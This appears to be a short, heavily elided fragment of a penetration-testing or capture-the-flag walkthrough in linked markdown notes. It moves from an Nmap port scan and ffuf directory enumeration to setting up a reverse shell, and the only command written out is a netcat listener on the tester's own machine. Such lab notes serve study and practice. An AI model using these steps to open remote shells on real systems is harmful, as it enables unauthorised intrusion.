...
Starting with a port scan using [[nmap.md | Nmap]]:
```bash
...
Proceeding with directory enumeration using [[ffuf.md | ffuf]]:
```bash
...
Python3 is available. Setting up a [[reverse-shell.md | Rerverse Shell]]:
```bash
# on my machine
nc -lvnp 4444
